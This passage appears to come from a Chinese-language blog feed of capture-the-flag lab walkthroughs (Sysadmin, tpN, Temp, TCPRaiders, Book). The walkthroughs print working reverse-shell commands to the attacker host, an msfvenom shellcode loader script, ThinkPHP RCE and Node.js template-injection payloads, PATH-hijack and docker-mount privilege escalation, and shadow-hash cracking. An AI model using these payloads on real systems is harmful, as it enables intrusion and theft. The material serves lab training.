}

long syscall(long num, long p1, long p2, long p3) {
    long ret;
    __asm__ volatile (
        'movq %1, %%rax\n'
        'movq %2, %%rdi\n'
        'movq %3, %%rsi\n'
        'movq %4, %%rdx\n'
        'syscall\n'
        'movq %%rax, %0\n'
        : '=m'(ret)
        : 'm'(num), 'm'(p1), 'm'(p2), 'm'(p3)
        : 'rax', 'rdi', 'rsi', 'rdx'
    );
    return ret;
}
```

**执行步骤：**

1. 在攻击机（`192.168.205.128`）上生成SSH密钥对，将公钥内容保存为 `authorized_keys` 文件，并于文件所在目录启动一个临时的HTTP服务。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

2. 将上述 `exploit.c` 的代码粘贴到目标Web应用的输入框中，并提交执行。

3. 观察攻击机上HTTP服务的日志，确认文件下载和命令执行情况。

   ```
   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /authorized_keys HTTP/1.1' 200 -
   192.168.205.145 - - [14/Aug/2025 23:06:01] 'GET /?echo HTTP/1.1' 404 -
   ```

   日志清晰地显示，目标主机首先成功请求了 `authorized_keys` 文件。随后，第二个请求的路径中包含了 `echo` 字符串，这是 `whoami` 命令执行结果的回显，从而确认了Web服务的运行用户为 `echo`。

## **3. 获取初始访问权限**

既然SSH公钥已成功部署到目标主机 `echo` 用户的家中，现在我们可以使用对应的私钥直接进行SSH登录。

```bash
ssh echo@192.168.205.145
```

成功登录后，通过 `id` 命令验证当前用户身份。

```bash
echo@Sysadmin:~$ id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```

至此，我们已成功获取了用户 `echo` 的交互式Shell，完成了初始访问。

# **三、权限提升**

## **1. Sudo权限枚举**

在获得初始立足点后，首要任务是探查是否存在权限提升的路径。我们检查当前用户 `echo` 的 `sudo` 配置。

```bash
echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

`sudo -l` 的输出揭示了关键信息：

1.  **`!env_reset`**：这是一个非常重要的安全配置。它告知我们，当 `echo` 用户使用 `sudo` 执行命令时，系统**不会**重置大部分用户的环境变量，其中就包括 `PATH` 环境变量。这个特性是本次提权漏洞的核心。
2.  **(root) NOPASSWD: /usr/local/bin/system-info.sh**：用户 `echo` 可以无需密码，以 `root` 权限执行 `/usr/local/bin/system-info.sh` 这个脚本。

## **2. PATH环境变量劫持**

接下来，我们审计该脚本的源代码，以分析是否存在可利用的缺陷。

```bash
echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash
#===================================
# Daily System Info Report
#===================================
echo 'Starting daily system information collection at $(date)'
echo '------------------------------------------------------'
echo 'Checking disk usage...'
df -h
echo 'Checking log directory...'
ls -lh /var/log/
find /var/log/ -type f -name '*.gz' -mtime +30 -exec rm {} \;
echo 'Checking critical services...'
systemctl is-active sshd
systemctl is-active cron
echo 'Collecting CPU and memory information...'
cat /proc/cpuinfo
free -m
echo '------------------------------------------------------'
echo 'Report complete at $(date)'
```

代码审计发现，脚本中调用的 `df`, `ls`, `find`, `systemctl`, `cat`, `free` 等一系列命令均未使用其绝对路径（如 `/bin/df`），而是直接使用相对路径。结合前述的 `!env_reset` 配置，一个经典的**PATH环境变量劫持**攻击路径就此形成。当脚本以 `root` 权限运行时，它会依据 `echo` 用户自定义的 `PATH` 环境变量来查找这些命令。

## **3. 提权至Root**

**攻击步骤：**

1. 首先，在 `echo` 用户的家目录下创建一个名为 `df` 的恶意脚本。我们的目标是利用 `root` 权限为 `/bin/bash` 程序赋予SUID权限位，从而创建一个 'root shell后门'。

   ```bash
   echo@Sysadmin:~$ echo '#!/bin/bash' &gt; df
   echo@Sysadmin:~$ echo 'chmod +s /bin/bash' &gt;&gt; df
   echo@Sysadmin:~$ chmod +x df
   ```

2. 接着，修改 `PATH` 环境变量，将当前目录（`.`）添加到其最前端。这样一来，当系统查找 `df` 命令时，会优先在我们创建的恶意脚本所在目录中找到并执行它。

   ```bash
   echo@Sysadmin:~$ export PATH=.:$PATH
   ```

3. 万事俱备，以 `root` 权限执行目标脚本，触发我们的Payload。

   ```bash
   echo@Sysadmin:~$ sudo -u root /usr/local/bin/system-info.sh
   ```

   脚本在执行到 `df -h` 时，会调用我们伪造的 `df` 程序，从而以 `root` 权限执行了 `chmod +s /bin/bash`。

4. 验证 `/bin/bash` 的权限，确认SUID位是否已成功设置。

   ```bash
   echo@Sysadmin:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
   ```

   权限位中的 `s` 明确表示SUID位设置成功。

5. 最后，利用这个带有SUID权限的 `bash` 来获取 `root` Shell。`-p` 参数用于确保`bash`在启动时不会因为安全原因放弃由SUID获得的有效用户ID（EUID）。

   ```bash
   echo@Sysadmin:~$ bash -p
   bash-5.0# id
   uid=1000(echo) gid=1000(echo) euid=0(root) egid=0(root) groups=0(root),1000(echo)
   ```

   `euid=0(root)` 的输出确认我们已成功提权至 `root` 用户。

## **4. 获取Flag**

成功获得最高权限后，读取并提交所有的flag文件。

```bash
bash-5.0# cat /root/root.txt /home/echo/user.txt
flag{root-8b8a8b353298f798e3eb8628661617b6}
flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}
```

渗透测试至此顺利完成。

# Sublarge思路

**Sublarge Payload (`a.sh`):**

```c
#!/usr/bin/env bash
LHOST='192.168.56.10'
LPORT='4444'
OUT_C='test.c'

# 1. 生成原始 shellcode
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST='$LHOST' LPORT='$LPORT' \
         -f raw 2&gt;/dev/null &gt; /tmp/rev.raw
[[ -s /tmp/rev.raw ]] || { echo '[-] msfvenom failed'; exit 1; }

# 2. 用十六进制格式输出
SC_HEX=$(xxd -p -c 1 /tmp/rev.raw | sed 's/^/0x/' | paste -sd',' -)

# 3. 写 C 文件：子进程后台执行
cat &gt; '$OUT_C' &lt;&lt;EOF
int fork(void);
int execve(const char *p,char *const a[],char *const e[]);

int main(void)
{
    if (fork() == 0) {
        unsigned char sc[] = {$SC_HEX};
        ((void(*)())sc)();
    }
    return 0;
}
EOF

echo '[+] Generated $OUT_C (forked)'
```

**执行步骤：**

1. 运行a.sh
2. 将生成的test.c上传到服务器
3. 监听sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</guid><pubDate>Sat, 16 Aug 2025 01:25:57 +0000</pubDate></item><item><title>内部_tpN</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</link><description># 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l           
...
192.168.205.131 08:00:27:2b:fe:37       PCS Systemtechnik GmbH
...
```

发现存活主机 `192.168.205.131`。

## 2. 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 20:21 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:2B:FE:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示目标开放了两个端口：

*   **22/tcp**: SSH 服务
*   **8080/tcp**: HTTP 服务

# 二、Web渗透

## 1. Web应用识别

访问 `http://192.168.205.131:8080`，页面显示为一个赛博朋克风格的网站。

```html
&lt;body&gt;
    &lt;h1&gt;欢迎来到赛博朋克世界&lt;/h1&gt;
    &lt;p&gt;这是一个使用ThinkPHP构建的赛博朋克风格的RCE。&lt;/p&gt;
    ...
&lt;/body&gt;
```

页面明确指出该应用是使用 **ThinkPHP** 框架构建的。

## 2. 目录与漏洞扫描

使用 `gobuster` 进行目录扫描，发现大量文件，但信息较为杂乱。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131:8080 -w ...
...
/index.php            (Status: 200) [Size: 2295]
/robots.txt           (Status: 200) [Size: 24]
/system.zip           (Status: 200) [Size: 22]
...
```

使用 `nuclei` 进行自动化漏洞扫描，发现 `phpinfo.php` 泄露和 `.gitignore` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.131:8080
...
[phpinfo-files] [http] [low] http://192.168.205.131:8080/phpinfo.php ...
[exposed-gitignore] [http] [info] http://192.168.205.131:8080/.gitignore
...
```

访问 `.gitignore` 文件，发现了一些被排除在版本控制之外的路径和文件，如 `.env` 和 `/vendor` 目录，这些通常包含敏感信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131:8080/.gitignore          
*.log
.env
composer.phar
...
/vendor
...
```

尝试访问 `.env` 文件，虽然没有直接获取到配置信息，但返回的错误页面暴露了框架的详细版本：**ThinkPHP V8.1.3**。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131:8080/.env
...
&lt;div class='copyright'&gt;
    &lt;a title='官方网站' href='http://www.thinkphp.cn'&gt;ThinkPHP&lt;/a&gt; 
    &lt;span&gt;V8.1.3&lt;/span&gt; 
    ...
&lt;/div&gt;
...
```

## 3. Git源码泄露

使用 `dirsearch` 进一步扫描，确认了 `.git` 目录的存在，这意味着网站源码可能被泄露。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.131:8080  
...
[20:35:40] 301 -  324B  - /.git  -&gt;  http://192.168.205.131:8080/.git/
...
```

使用 `git-dumper` 工具将泄露的 `.git` 仓库完整下载到本地。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ git-dumper http://192.168.205.131:8080/ .                
...
[-] Running git checkout .
从索引区更新了 71 个路径
```

## 4. 代码审计

下载源码后，对关键文件进行审计，寻找漏洞。

* **`app/admin/controller/Admin.php`**:
  在 `Admin` 控制器中发现一个 `hello` 方法，其核心代码为 `call_user_func($b, $a);`。这是一个典型的命令执行漏洞，其中参数 `$a` 和 `$b` 均可通过URL传入，意味着我们可以控制调用的函数（`$b`）和其参数（`$a`）。

  ```php
  public function hello($a,$b)
  {
      call_user_func($b, $a); // 漏洞点
  }
  ```

* **`app/admin/route/app.php`**:
  路由文件显示，`sb/:a/:b` 路径被绑定到了 `Admin/hello` 方法。开发者注释“不知道为什么我这个路由是无效的”，但实际上，由于应用映射的配置 (`'app_map' =&gt; ['think'=&gt;'admin']`)，访问路径应为 `/think/admin/hello/...`。

  ```php
  Route::rule('sb/:a/:b','Admin/hello');
  ```

* **`app/middleware/Check1.php`**:
  `Admin` 控制器使用了 `Check1` 中间件，它会校验 `Session` 中的 `sb` 和 `token` 是否相等且不为空，这是一个简单的身份验证。

  ```php
  if ((Session::get('sb')==Session::get('token')&amp;&amp;!empty(Session::get('sb'))&amp;&amp;!empty(Session::get('token')))){
      return $next($request);
  }
  ```

* **`app/middleware/Check.php`**:
  存在一个全局中间件，通过黑名单正则过滤URL中的危险函数，如 `system`, `exec`, `eval` 等。但 `passthru` 等函数并未在黑名单中，可以绕过。

  ```php
  $pattern = '/\b(eval|exec|system|...|phpinfo)\b/i';
  ```

# 三、漏洞利用

## 1. 获取Token

根据代码审计，需要先获取一个合法的 `token` 才能访问后台控制器。`app/index/controller/Token.php` 文件逻辑显示，向 `/index.php/index/token/token` 发送 `sb=admin` 的POST请求即可获得`token`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/index.php/index/token/token -d 'sb=admin' -c cookie.txt
...
&lt;p class='message'&gt;获取成功: 2fce588f94d6d5edcfea90156254f130a4aed575&lt;/p&gt;
...
```

## 2. RCE执行命令

携带上一步获取的`cookie`，构造Payload访问漏洞路由。我们使用 `passthru` 函数绕过黑名单检测，执行 `id` 命令。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/think/admin/hello/a/id/b/passthru -b cookie.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

命令成功执行，当前用户为 `www-data`。

## 3. 反弹Shell

在本地监听端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                        
listening on [any] 8888 ...
```

构造反弹Shell的Payload，并进行URL编码后发送：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/think/admin/hello/a/busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20bash/b/passthru -b cookie.txt
```

成功接收到反弹Shell，并使用`script`和`stty`等命令升级为交互式TTY。

# 四、权限提升

## 1. 用户切换

在 `/home` 目录下发现 `welcome` 用户，并在其家目录中找到一个名为 `.pwd` 的可疑文件，这可能是一个密码字典。

```bash
www-data@tpN:/home/welcome$ ls -al
...
-rw-r--r-- 1 root    root    3510 Jul 22 09:56 .pwd
-rw-r--r-- 1 root    root      26 Jul 24 09:27 uesr.txt
```

将`suForce`上传到目标服务器，并使用`suForce`工具进行爆破。

```bash
www-data@tpN:/tmp$ ./suForce -u welcome -w pass
...
💥 Password | eecho
...
```

成功爆破出 `welcome` 用户的密码为 `eecho`。切换用户成功。

```bash
www-data@tpN:/tmp$ su welcome
Password: eecho
welcome@tpN:/tmp$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

## 2. 内核漏洞提权

切换到 `welcome` 用户后，执行 `sudo -l` 发现没有sudo权限。上传并运行 `linpeas.sh` 脚本进行提权漏洞扫描，发现系统内核可能存在 **CVE-2021-3490** 漏洞。

```bash
...
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops
   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
...
```

下载并编译该漏洞的exploit。

```bash
welcome@tpN:/tmp$ busybox wget https://.../CVE-2021-3490/zip/main
welcome@tpN:/tmp$ unzip main 
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ make
gcc -DGROOVY -o bin/exploit.bin -I include/ exploit.c bpf.c kmem_search.c
```

执行exploit，成功获取root权限。

```bash
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main/bin$ ./exploit.bin 
...
[!] preparing to overwrite creds...
[+] success! enjoy r00t :)
# id
uid=0(root) gid=0(root) groups=0(root),1000(welcome)
```

# 五、夺取Flag

在root权限下，读取用户和root的flag。

```bash
root@tpN:/# cat /root/root.txt /home/welcome/uesr.txt 
flag{root-不错不错}
flag{user-eecho123456789}
```

渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</guid><pubDate>Sat, 16 Aug 2025 01:25:13 +0000</pubDate></item><item><title>内部_Temp</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</link><description># **一、信息收集**

首先，在目标网段内使用`arp-scan`进行主机发现，以确定目标的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:72:8f:66       PCS Systemtechnik GmbH
...
```

确定目标IP为 `192.168.205.132` 后，使用`nmap`对其进行全端口扫描，以探测开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 09:47 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:72:8F:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示目标开放了22 (SSH)、80 (HTTP) 和 3000 (PPP, 实际为Web服务) 端口。

# **二、漏洞利用**

访问目标80端口，发现是一个名为 'Safe Welcome Message Processor' 的Web应用。访问3000端口，则是一个功能相似的 'Welcome Message Processor' 应用。

经过测试，发现3000端口的Web应用存在服务器端模板注入（SSTI）漏洞。通过提交payload `&lt;%= 7*7 %&gt;`，服务器成功执行了乘法运算并返回了结果 `49`，确认了漏洞的存在。

![image-20250815215732917](http://7r1UMPHK.github.io/image/20250815224342800.webp)

为了进一步利用此漏洞，构造了一个可以执行系统命令的payload。该payload利用Node.js的`child_process`模块来执行`id`命令，并回显结果。

**命令执行Payload:**

```javascript
&lt;% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('id'); %&gt;&lt;%= output %&gt;
```

![image-20250815215910295](http://7r1UMPHK.github.io/image/20250815224346104.webp)

服务器成功返回了`uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)`，表明命令已在目标系统上以`welcome`用户身份执行。

接下来，利用该漏洞获取一个反向shell。首先在Kali攻击机上设置Netcat监听8888端口。

**Kali监听:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

然后，在Web页面提交反弹shell的payload。

**反弹Shell Payload:**

```javascript
&lt;% const require = this.process.mainModule.require; const { execSync } = require('child_process'); const output = execSync('busybox nc 192.168.205.128 8888 -e /bin/bash'); %&gt;&lt;%= output %&gt;
```

提交后，成功在Kali上接收到来自目标主机的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 43342
id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

为了获得更好的交互体验，对获取的shell进行稳定化处理。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

在获取了`welcome`用户的shell后，开始进行提权操作。首先，检查用户的`sudo`权限。

```bash
welcome@Temp:/opt/ssti-welcome$ sudo -l
...
User welcome may run the following commands on Temp:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

`sudo -l`结果显示`welcome`用户只能以`NOPASSWD`方式执行`/usr/sbin/reboot`命令，此权限对提权没有直接帮助。

接着，在用户家目录下发现并读取了`user.txt`文件，获得了第一个flag。

```bash
welcome@Temp:~$ cat user.txt
flag{user-12f54a96f64443246930da001cafda8b}
```

为了更全面地收集系统信息，上传并执行`linpeas.sh`脚本进行自动化枚举。

```bash
welcome@Temp:~$ cd /tmp
welcome@Temp:/tmp$ busybox wget 192.168.205.128/linpeas.sh
welcome@Temp:/tmp$ bash /tmp/linpeas.sh
...
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
...
/etc/group
...
```

`linpeas`的扫描结果显示`/etc/group`文件对于当前用户是可写的，这是一个关键的提权向量。我们可以通过修改该文件，将`welcome`用户添加到`sudo`或`shadow`等高权限用户组。

为了能够读取`/etc/shadow`文件以破解用户密码，决定将`welcome`用户添加到`shadow`组。

## **1. 配置SSH免密登录**

由于不知道`welcome`用户的密码，无法直接切换组。因此，首先配置SSH免密登录，以便在修改`/etc/group`后能以新组的身份重新登录。

在`welcome`用户家目录下创建`.ssh`目录，并从Kali攻击机下载`authorized_keys`文件。

```bash
welcome@Temp:~$ mkdir .ssh
welcome@Temp:~$ cd .ssh/
welcome@Temp:~/.ssh$ busybox wget 192.168.205.128/authorized_keys
```

## **2. 修改`/etc/group`**

使用`vim`或其他编辑器打开`/etc/group`文件，将`welcome`用户添加到`shadow`组和`sudo`组。

```bash
welcome@Temp:~/.ssh$ vim /etc/group
```

修改后的内容如下：

```
...
sudo:x:27:welcome
...
shadow:x:42:welcome
...
```

## **3. 读取shadow文件并破解密码**

修改完成后，从Kali攻击机通过SSH连接到目标，此时`welcome`用户已具备`shadow`组的权限，可以直接读取`/etc/shadow`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh welcome@192.168.205.132
...
welcome@Temp:~$ cat /etc/shadow
root:$6$OJ3tCiDX7okU1mml$K5.VqI9J/kSkDxb.et6AWCJnfN0//2VmsjZlwdBCeDK2MgHpojEVMs7hd3FAuQ1EYIJpHnUMMR.pz3uQvpzGr1:20293:0:99999:7:::
...
welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.:20293:0:99999:7:::
```

将`welcome`用户的密码哈希保存下来，使用`John the Ripper`和`rockyou.txt`字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'welcome:$6$5aPJr2PfLEe1OJqk$vcaYOfDgCNO.G.PkNFM0Lj2CS803S5FSogWPHcZSPTSjSEec1YveEGhJ0JXnEGlzRxx1BlH0UJeIIbP7RN2XT.' &gt; hash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
sainsburys       (welcome)
...
Session completed.
```

成功破解出`welcome`用户的密码为 `sainsburys`。

## **4. 获取Root权限**

由于之前已将`welcome`用户添加到了`sudo`组，现在可以直接使用破解出的密码切换到root用户。

```bash
welcome@Temp:~$ sudo bash
[sudo] password for welcome: sainsburys
root@Temp:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取root权限后，读取`/root/root.txt`和`/home/welcome/user.txt`，获得所有flag。

```bash
root@Temp:/home/welcome# cat /root/root.txt /home/welcome/user.txt
flag{root-60b725f10c9c85c70d97880dfe8191b3}
flag{user-12f54a96f64443246930da001cafda8b}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</guid><pubDate>Fri, 15 Aug 2025 14:48:12 +0000</pubDate></item><item><title>内部_TCPRaiders</title><link>https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</link><description># **一、信息收集**

## **1. 主机发现**

首先在本地网络中使用 `arp-scan` 扫描本地网络，以确定目标主机的IP地址。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.146        08:00:27:39:c8:97       PCS Systemtechnik GmbH
...
```

从扫描结果可知，目标靶机的IP地址为 `192.168.205.146`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.146
...
0/tcp open  unknown
...
```

0端口是不允许浏览器访问的，所以转发一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ socat TCP-LISTEN:8000,fork TCP4:192.168.205.146:0 &amp;    
[1] 23767
```

# **二、漏洞发现与初始访问**

## 1.Web

访问本地8000端口

![image-20250815112328650](http://7r1UMPHK.github.io/image/20250815213356794.webp)

尝试curl助力链接显示助力成功，并且重新curl显示助力过了，应该是存在IP检测的问题。测试发现，该IP检测只检测IP地址的前16位，即 `x.x.1.1` 格式即可，那写批量助力脚本。

```perl
perl -MLWP::UserAgent -e '$ua=LWP::UserAgent-&gt;new(timeout=&gt;1);for $i (0..255){for $j (0..255){$ip='$i.$j.1.1';$ua-&gt;get('http://192.168.205.128:8000/support?token=eb0c6310-07b2-4609-9f3e-4a59ce09949a','X-Forwarded-For'=&gt;$ip);print '$ip\n';}}'
```

在脚本执行完成后，再次访问Web服务，发现之前隐藏的页面是Webshell。

## **2. 获取反弹Shell**

通过新出现的Webshell界面，我们执行反弹shell命令。由于目标系统为 Alpine Linux，它默认不包含 `bash`，因此我们使用 `busybox` 内置的 `nc` 和 `ash` 来获取反弹shell。

**本地Kali开启监听:**

```bash
nc -lvnp 8888
```

**在Webshell中执行Payload:**

```bash
busybox nc 192.168.205.128 8888 -e /bin/ash
```

执行后，在本地 `8888` 端口成功接收到 `runner` 用户的交互式Shell。

## **3. 稳定Shell**

```
python3 -c 'import pty; pty.spawn('/bin/ash')'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/ash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. runner -&gt; luna**

获取初步Shell后，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
/opt/web $ sudo -l
...
User runner may run the following commands on tcpraiders:
    (luna) NOPASSWD: /usr/sbin/luna
```

结果显示 `runner` 用户可以免密以 `luna` 用户身份运行 `/usr/sbin/luna` 程序。

尝试执行该程序，发现它会输出一段反向的英文字符串，并等待输入。

```bash
/opt/web $ sudo -u luna /usr/sbin/luna
.yranoitcid eht ni semit 511 dnuof neeb sah tI .kaew oot si drowssap ruoY :TRELA

# 使用rev命令反转字符串
/opt/web $ sudo -u luna /usr/sbin/luna | rev
ALERT: Your password is too weak. It has been found 115 times in the dictionary.
```

这明显是一个密码验证程序。程序逻辑可能是将用户输入与某个正确密码进行比较。考虑到提示信息，该程序可能将用户的输入进行反向处理。因此，我们需要一个反向的字典进行爆破。

我们使用 `rockyou.txt` 字典，将其整本反转后，通过管道符和循环来爆破密码。

```bash
# 在/tmp目录准备反转后的字典
cd /tmp
wget http://192.168.205.128/rockyou.txt
rev rockyou.txt &gt; pass

# 执行爆破脚本
echo 'hold on...' &amp;&amp; while read p; do echo '$p' | sudo -u luna /usr/sbin/
luna | grep -q tcerrocnI || { echo '[+] Found: $p'; break; }; done &lt; pass
hold on...
/tmp $ 
[+] Found: ebyam
```

成功找到密码为 `ebyam`。现在，我们执行 `/usr/sbin/luna` 并输入该密码，成功切换到 `luna` 用户。

```bash
/opt $ sudo -u luna /usr/sbin/luna
 drowssaP: ebyam
/opt $ id
uid=1001(luna) gid=1001(luna) groups=1001(luna)
```

## **2. luna -&gt; root**

在 `luna` 用户的shell中，再次执行 `sudo -l`。

```bash
/opt $ sudo -l
...
User luna may run the following commands on tcpraiders:
    (ALL) NOPASSWD: /usr/bin/docker build *, /usr/bin/docker run *
```

发现 `luna` 用户可以免密以 `root` 权限执行任意 `docker build` 和 `docker run` 命令。这是一个典型的提权路径。由于靶机可以访问外网，我们可以直接拉取一个镜像来利用。

我们利用 `docker run` 命令，将宿主机的根目录 `/` 挂载到容器的 `/mnt` 目录，然后在容器内执行 `chroot /mnt`，从而获得宿主机的 `root` shell。

```bash
/opt $ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
...
Status: Downloaded newer image for alpine:latest
/ # id
uid=0(root) gid=0(root) groups=0(root),...
```

成功获取 `root` 权限。最后，读取位于用户目录和 `root` 目录下的 flag 文件。

```bash
/ # cat /root/root.flag /home/luna/user.flag
flag{641d35852cd6fdaab8a6a621d40c3d5ac2b453aa}
flag{1b925e677f649ce856f61e3846466252e75cc179}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</guid><pubDate>Fri, 15 Aug 2025 13:34:38 +0000</pubDate></item><item><title>内部_Book</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Book.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:5d:bd:e0       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 08:53 EDT
Nmap scan report for 192.168.205.142
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:5D:BD:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds```
```

扫描结果表明，目标主机IP为 `192.168.205.142`，开放了 **22 (SSH)**、**80 (HTTP)** 和 **443 (HTTPS)** 端口。访问80端口会自动跳转到443端口。

## **2. 服务侦察**

* **HTTPS (443端口):** 访问该服务发现是一个基于开源项目 `cstimer` 的魔方计时网站。

  &gt; [!Tip]
  &gt;
  &gt; https://github.com/cs0x7f/cstimer

  ![image-20250814205523360](C:\Users\ABCDEFG888\AppData\Roaming\Typora\typora-user-images\image-20250814205523360.png)

# **二、漏洞发现与初始访问**

## **1. Web参数模糊测试与RCE**

对网站进行参数模糊测试，发现一个名为 `cmd` 的参数存在远程代码执行（RCE）漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://192.168.205.142?FUZZ=id' --fw 3928

...
cmd                     [Status: 200, Size: 55130, Words: 3930, Lines: 359, Duration: 228ms]
...
```

## **2. 获取 www-data Shell**

经过测试发现，目标主机上没有 `busybox` 和 `curl`，直接使用 `bash` 反弹shell也失败（可能是我的问题，你可以尝试一下）。最终选择使用 `socat` 来获取反弹shell。

**本地监听:**

```bash
nc -lvnp 8888
```

